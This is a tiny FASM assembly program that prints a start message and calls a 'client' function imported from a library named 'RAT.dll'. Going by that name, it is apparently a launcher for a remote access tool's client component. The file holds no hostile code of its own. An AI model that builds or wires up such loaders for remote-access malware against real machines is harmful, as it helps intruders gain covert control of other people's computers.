format PE console

include 'win32a.inc'

       entry DllEntrypoint

section '.data' data readable writable

        result db 'Dll has been started!', 0


section '.text' code readable executable

        DllEntrypoint:
                push result
                call [printf]
                invoke client

section '.idata' import data readable

        library msvcrt, 'msvcrt.dll', \
                RAT, 'RAT.dll'

        import RAT,\
               client, 'client'

        import msvcrt,\
               printf, 'printf'
